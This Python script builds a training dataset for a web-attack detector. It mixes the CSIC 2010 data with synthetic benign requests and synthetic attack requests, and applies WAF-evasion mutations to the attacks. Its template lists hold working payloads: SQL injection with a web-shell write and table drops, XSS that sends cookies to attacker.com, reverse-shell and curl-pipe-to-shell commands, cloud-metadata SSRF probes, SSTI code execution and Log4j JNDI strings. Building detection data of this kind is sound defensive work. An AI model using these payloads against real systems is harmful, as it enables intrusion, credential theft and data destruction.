import os
import random
import uuid
import urllib.parse
import urllib.request
import pandas as pd

DATASET_DIR = os.path.join(os.path.dirname(__file__), "dataset")
CSIC_CSV_URL = "https://raw.githubusercontent.com/msudol/Web-Application-Attack-Datasets/master/CSVData/csic_final.csv"
CSIC_PATH = os.path.join(DATASET_DIR, "csic_final.csv")
ENHANCED_PAYLOADS_PATH = os.path.join(DATASET_DIR, "enhanced_payloads.csv")

random.seed(42)

# ==========================================
# 1. SYNTHETIC BENIGN TRAFFIC GENERATOR
# ==========================================
BENIGN_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/terms", "/privacy",
    "/api/v1/health", "/api/v1/status", "/metrics", "/ping",
    "/login", "/register", "/auth/login", "/auth/register", "/auth/logout",
    "/api/v1/users", "/api/v1/users/profile", "/api/v1/settings",
    "/products", "/categories", "/items", "/search", "/catalog",
    "/checkout", "/cart", "/order/status", "/billing", "/invoice",
    "/dashboard", "/dashboard/analytics", "/dashboard/reports",
    "/blog", "/news", "/posts", "/articles", "/faq", "/support", "/feedback",
    "/assets/css/main.css", "/assets/js/bundle.js", "/favicon.ico", "/images/logo.png"
]

BENIGN_SEARCH_WORDS = [
    "laptop", "gaming monitor", "mechanical keyboard", "wireless mouse",
    "usb-c cable", "smart watch", "bluetooth headphones", "leather jacket",
    "coffee maker", "standing desk", "docker tutorial", "python web dev",
    "microservices architecture", "cloud security", "cyber threat intel",
    "รองเท้าวิ่ง", "เสื้อยืดคอกลม", "อาหารแมว", "กระเป๋าเดินทาง", "โปรโมชั่นพิเศษ"
]

BENIGN_FIRST_NAMES = ["Alice", "Bob", "Charlie", "David", "Emma", "Somchai", "Somsak", "Supaporn", "Kanya", "Thanawat"]
BENIGN_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Rattanasiri", "Sukprasert", "Phonphong", "Wong"]
BENIGN_DOMAINS = ["gmail.com", "outlook.com", "yahoo.com", "company.co.th", "university.ac.th", "enterprise.org"]

def generate_synthetic_benign(count: int = 25000) -> list:
    """Generate diverse, realistic modern web requests (REST, SPA, JSON, Forms, Static, Home) with realistic IDs, numbers, and queries."""
    records = []
    
    # 1. Parameter-free GET requests (Browsing, Static, Pages, Health) -> 30% of traffic
    clean_routes = [
        "/", "/index.html", "/home", "/about", "/contact", "/terms", "/privacy",
        "/api/v1/health", "/api/v1/status", "/metrics", "/ping", "/robots.txt", "/sitemap.xml",
        "/login", "/register", "/auth/login", "/auth/register", "/auth/logout",
        "/dashboard", "/dashboard/analytics", "/dashboard/reports", "/dashboard/settings",
        "/products", "/categories", "/catalog", "/checkout", "/cart", "/order/status",
        "/blog", "/news", "/posts", "/articles", "/faq", "/support", "/feedback",
        "/favicon.ico", "/assets/css/main.css", "/assets/js/bundle.js", "/images/logo.png"
    ]
    
    for i in range(count):
        choice = random.random()
        
        # Format 1: Clean Browsing / Route GET (no query or simple path) -> 30%
        if choice < 0.30:
            base_route = random.choice(clean_routes)
            if random.random() > 0.6:
                # Sub-resource path like /products/1234 or /blog/post-56
                sub_id = str(uuid.uuid4()) if random.random() > 0.5 else str(random.randint(1, 99999))
                uri = f"{base_route}/{sub_id}"
            else:
                uri = base_route
                
            records.append({
                "URI": uri,
                "GET-Query": "",
                "POST-Data": "",
                "Method": "GET",
                "Class": "Valid"
            })
            
        # Format 2: REST API & Search & Filter GET with normal query parameters -> 35%
        elif choice < 0.65:
            if random.random() > 0.4:
                term = urllib.parse.quote(random.choice(BENIGN_SEARCH_WORDS))
                cat = random.choice(["electronics", "clothing", "books", "home", "appliances", "automotive", "tech", "gaming"])
                min_p = random.randint(10, 500)
                max_p = min_p + random.randint(500, 5000)
                page = random.randint(1, 20)
                query = f"q={term}&category={cat}&min_price={min_p}&max_price={max_p}&page={page}&sort=asc"
                uri = "/search" if random.random() > 0.5 else "/products"
            else:
                item_id = str(uuid.uuid4()) if random.random() > 0.4 else str(random.randint(1, 99999))
                page = random.randint(1, 50)
                limit = random.choice([10, 20, 25, 50, 100])
                sort_by = random.choice(["created_at", "price", "name", "popularity", "rating", "id", "updated_at"])
                order = random.choice(["asc", "desc"])
                query = f"page={page}&limit={limit}&sort={sort_by}&order={order}"
                uri = f"/api/v1/{random.choice(['users', 'items', 'orders', 'logs', 'reports'])}"
                
            records.append({
                "URI": uri,
                "GET-Query": query,
                "POST-Data": "",
                "Method": "GET",
                "Class": "Valid"
            })
            
        # Format 3: JSON API POST Request -> 20%
        elif choice < 0.85:
            fname = random.choice(BENIGN_FIRST_NAMES)
            lname = random.choice(BENIGN_LAST_NAMES)
            email = f"{fname.lower()}.{lname.lower()}{random.randint(1,99)}@{random.choice(BENIGN_DOMAINS)}"
            user_id = random.randint(1000, 99999)
            
            target_path = random.choice(["/api/v1/auth/login", "/api/v1/users", "/api/v1/settings", "/api/v1/cart/add"])
            if "login" in target_path or "auth" in target_path:
                body = f'{{"username": "{email}", "password": "UserPass{random.randint(1000, 9999)}!", "remember_me": true}}'
            elif "settings" in target_path:
                body = f'{{"user_id": {user_id}, "theme": "{random.choice(["dark", "light", "system"])}", "notifications": true, "lang": "{random.choice(["en", "th", "jp"])}", "page_size": 25}}'
            else:
                body = f'{{"id": {user_id}, "name": "{fname} {lname}", "email": "{email}", "role": "user", "active": true, "score": {random.randint(50, 100)}, "created_year": 2026}}'
                
            records.append({
                "URI": target_path,
                "GET-Query": "",
                "POST-Data": body,
                "Method": "POST",
                "Class": "Valid"
            })
            
        # Format 4: Form-urlencoded POST Request (Contact / Support / Login) -> 15%
        else:
            fname = random.choice(BENIGN_FIRST_NAMES)
            lname = random.choice(BENIGN_LAST_NAMES)
            email = f"{fname.lower()}@{random.choice(BENIGN_DOMAINS)}"
            order_no = random.randint(10000, 99999)
            msg = urllib.parse.quote(f"Hello support team, I have a question regarding order #{order_no}. Thanks!")
            phone = f"08{random.randint(10000000, 99999999)}"
            
            if random.random() > 0.5:
                body = f"username={fname.lower()}{random.randint(1,99)}&password=Password{random.randint(100,999)}!&remember=1"
                uri = "/login"
            else:
                body = f"name={fname}+{lname}&email={email}&phone={phone}&order_id={order_no}&subject=General+Inquiry&message={msg}"
                uri = "/contact" if random.random() > 0.5 else "/support/ticket"
            
            records.append({
                "URI": uri,
                "GET-Query": "",
                "POST-Data": body,
                "Method": "POST",
                "Class": "Valid"
            })
            
    return records


# ==========================================
# 2. SYNTHETIC MODERN ATTACK TRAFFIC GENERATOR
# ==========================================
SQLI_TEMPLATES = [
    "admin' OR '1'='1' --",
    "admin' OR 1=1 #",
    "1' OR 'a'='a",
    "') OR ('1'='1' --",
    "1 UNION SELECT 1,2,username,password FROM users-- -",
    "1' UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables--",
    "1' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
    "1; DROP TABLE users;--",
    "1' OR 1=1 AND 'b'='b",
    "admin'/*",
    "1' UNION SELECT 1,load_file('/etc/passwd'),3,4--",
    "1' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php phpinfo();?>'--"
]

XSS_TEMPLATES = [
    "<script>alert('XSS_ATTACK')</script>",
    "<script src='http://attacker.com/hook.js'></script>",
    "<img src=x onerror=alert(document.domain)>",
    "<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">",
    "<svg/onload=alert(document.cookie)>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert(`XSS`)\"></iframe>",
    "javascript:alert(1)",
    "\"><script>eval(atob('YWxlcnQoMSk='))</script>",
    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>"
]

TRAVERSAL_TEMPLATES = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "../../../../boot.ini",
    "/windows/win.ini"
]

RCE_TEMPLATES = [
    "; cat /etc/passwd",
    "| cat /etc/shadow",
    "&& whoami",
    "| id",
    "`uname -a`",
    "$(whoami)",
    "; nc -e /bin/sh attacker.com 4444",
    "| bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "; curl http://attacker.com/malware.sh | sh",
    "; wget http://attacker.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd",
    "cat${IFS}/etc/passwd",
    "id;whoami;uname -a"
]

SSRF_TEMPLATES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:8080/admin",
    "http://localhost:9000/internal-api",
    "http://10.0.0.1/internal/config",
    "http://192.168.1.1/admin/network",
    "http://0.0.0.0:6379/",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_flushall"
]

SSTI_TEMPLATES = [
    "{{7*7}}",
    "{{config.items()}}",
    "${7*7}",
    "#{7*7}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
    "<%= 7 * 7 %>"
]

NOSQL_LOG4J_TEMPLATES = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"$regex": "^admin"}',
    "${jndi:ldap://attacker.com/a}",
    "${jndi:rmi://10.0.0.1:1099/exploit}",
    "${${lower:j}ndi:${lower:l}dap://evil.com/x}"
]

def mutate_payload(payload: str) -> str:
    """Apply realistic WAF evasion mutations (case variation, comment injection, url encoding)."""
    mutated = payload
    op = random.random()
    
    # 1. Random Case Swapping (e.g. uNiOn SeLeCt)
    if op < 0.25:
        mutated = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in mutated)
    # 2. SQL Comment Insertion
    elif op < 0.45 and " " in mutated:
        mutated = mutated.replace(" ", "/**/")
    # 3. URL-encode selected chars
    elif op < 0.65:
        mutated = urllib.parse.quote(mutated)
    # 4. Double URL encoding
    elif op < 0.80:
        mutated = urllib.parse.quote(urllib.parse.quote(mutated))
    # 5. Plus for spaces
    else:
        mutated = mutated.replace(" ", "+")
        
    return mutated

def generate_synthetic_attacks(count: int = 8000) -> list:
    """Generate diverse, multi-category OWASP Top 10 attack payloads with realistic mutations."""
    records = []
    
    all_categories = [
        ("SQLi", SQLI_TEMPLATES),
        ("XSS", XSS_TEMPLATES),
        ("Traversal", TRAVERSAL_TEMPLATES),
        ("RCE", RCE_TEMPLATES),
        ("SSRF", SSRF_TEMPLATES),
        ("SSTI", SSTI_TEMPLATES),
        ("NoSQL_Log4j", NOSQL_LOG4J_TEMPLATES)
    ]
    
    for i in range(count):
        cat_name, templates = random.choice(all_categories)
        base_payload = random.choice(templates)
        
        # Apply mutation 60% of the time to simulate evasion
        payload = mutate_payload(base_payload) if random.random() > 0.4 else base_payload
        
        method = "POST" if random.random() > 0.55 else "GET"
        target_uri = random.choice([
            "/login", "/login.php", "/api/v1/auth", "/search", "/products",
            "/download", "/view", "/fetch_url", "/api/v1/render", "/api/exec",
            "/graphql", "/submit", "/comment", "/profile/update"
        ])
        
        param_name = random.choice([
            "id", "user", "username", "q", "query", "search", "file", "path",
            "url", "redirect", "cmd", "exec", "template", "msg", "filter", "data"
        ])
        
        if method == "GET":
            query = f"{param_name}={payload}"
            if random.random() > 0.5:
                query += f"&ref={uuid.uuid4().hex[:6]}&timestamp={random.randint(1600000000, 1750000000)}"
            records.append({
                "URI": target_uri,
                "GET-Query": query,
                "POST-Data": "",
                "Method": "GET",
                "Class": "Anomalous"
            })
        else:
            if random.random() > 0.5:
                # JSON Payload
                body = f'{{"{param_name}": "{payload}", "client_id": "{uuid.uuid4().hex[:8]}"}}'
            else:
                # Form Payload
                body = f"{param_name}={payload}&submit=1&token={uuid.uuid4().hex[:6]}"
                
            records.append({
                "URI": target_uri,
                "GET-Query": "",
                "POST-Data": body,
                "Method": "POST",
                "Class": "Anomalous"
            })
            
    return records


# ==========================================
# 3. DATASET DOWNLOAD & MULTI-SOURCE COMBINER
# ==========================================
def download_csic_dataset():
    os.makedirs(DATASET_DIR, exist_ok=True)
    if os.path.exists(CSIC_PATH):
        print(f"[+] CSIC Dataset already exists at: {CSIC_PATH}")
    else:
        print(f"[*] Downloading CSIC dataset from {CSIC_CSV_URL} ...")
        urllib.request.urlretrieve(CSIC_CSV_URL, CSIC_PATH)
        print(f"[+] Download complete: {CSIC_PATH}")
    return CSIC_PATH

def generate_enhanced_dataset(benign_count: int = 25000, attack_count: int = 15000):
    """Generate high-diversity non-duplicate synthetic payloads dataset."""
    print(f"[*] Generating {benign_count} synthetic benign + {attack_count} synthetic modern attack payloads...")
    benign_samples = generate_synthetic_benign(benign_count)
    attack_samples = generate_synthetic_attacks(attack_count)
    
    all_extra = benign_samples + attack_samples
    random.shuffle(all_extra)
    
    df_extra = pd.DataFrame(all_extra)
    # Deduplicate to ensure 100% unique rows
    df_extra = df_extra.drop_duplicates(subset=["URI", "GET-Query", "POST-Data", "Method"]).reset_index(drop=True)
    
    df_extra.to_csv(ENHANCED_PAYLOADS_PATH, index=False)
    print(f"[+] Exported {len(df_extra)} UNIQUE enhanced synthetic samples -> {ENHANCED_PAYLOADS_PATH}")
    return df_extra

def load_combined_dataset():
    """Load CSIC 2010 (cleaned of header-only label noise) + Modern Synthetic Dataset with ZERO exact duplicate replication."""
    download_csic_dataset()
    
    # Generate fresh modern synthetic dataset
    df_synthetic = generate_enhanced_dataset(benign_count=25000, attack_count=15000)
    
    print("[*] Loading base CSIC 2010 dataset and filtering label noise...")
    df_csic = pd.read_csv(CSIC_PATH)
    
    # Standardize column naming if necessary
    for col in ["URI", "GET-Query", "POST-Data", "Method", "Class"]:
        if col not in df_csic.columns:
            for alt in [col.lower(), col.replace("-", "_"), col.replace("-", "")]:
                if alt in df_csic.columns:
                    df_csic.rename(columns={alt: col}, inplace=True)
                    
    # Filter CSIC Anomalous rows that have zero payload in GET/POST and clean benign-like paths (which are header-only anomalies)
    # This prevents poisoning the URL/Payload classifier
    csic_valid = df_csic[df_csic['Class'] == 'Valid']
    csic_anom = df_csic[df_csic['Class'] == 'Anomalous']
    
    # Keep anomalous rows that have actual payload in Query, Body, or suspicious characters/extensions in URI
    has_payload = csic_anom['GET-Query'].notna() | csic_anom['POST-Data'].notna()
    has_suspicious_uri = csic_anom['URI'].astype(str).str.contains(r"(\.\.|~|\.bak|\.inc|\.old|\.sql|%|<|>|'|\"|;|`|\$)", case=False, regex=True)
    csic_anom_cleaned = csic_anom[has_payload | has_suspicious_uri]
    
    df_csic_cleaned = pd.concat([csic_valid, csic_anom_cleaned], ignore_index=True)
    print(f"[+] CSIC 2010 Cleaned: {len(df_csic_cleaned)} rows (Filtered {len(csic_anom) - len(csic_anom_cleaned)} non-payload anomalies)")
    
    # Combine without naive multiplication (*500 removed!)
    df_combined = pd.concat([df_csic_cleaned, df_synthetic], ignore_index=True)
    
    # Deduplicate across the combined dataset to guarantee zero leakage
    initial_len = len(df_combined)
    df_combined = df_combined.drop_duplicates(subset=["URI", "GET-Query", "POST-Data", "Method"]).reset_index(drop=True)
    
    print(f"[+] Total Combined Unique Dataset Rows: {len(df_combined)} (Cleaned from {initial_len})")
    print(f"    - Benign Samples: {sum(df_combined['Class'].astype(str).str.lower().isin(['valid', '0']))}")
    print(f"    - Attack Samples: {sum(df_combined['Class'].astype(str).str.lower().isin(['anomalous', '1']))}")
    
    return df_combined

if __name__ == "__main__":
    load_combined_dataset()

